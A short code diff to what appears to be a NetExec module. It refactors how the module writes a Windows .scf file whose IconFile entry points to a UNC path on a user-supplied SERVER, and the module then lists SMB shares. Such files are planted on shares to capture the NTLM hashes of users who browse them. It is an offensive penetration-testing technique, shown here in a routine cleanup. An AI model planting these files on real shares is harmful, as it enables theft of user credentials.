@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import ntpath
 from sys import exit
 
@@ -52,11 +49,11 @@ class NXCModule:
 
         if not self.cleanup:
             self.server = module_options["SERVER"]
-            scuf = open(self.scf_path, "a")
-            scuf.write(f"[Shell]\n")
-            scuf.write(f"Command=2\n")
-            scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
-            scuf.close()
+            
+            with open(self.scf_path, "a") as scuf:
+                scuf.write("[Shell]\n")
+                scuf.write("Command=2\n")
+                scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
 
     def on_login(self, context, connection):
         shares = connection.shares()
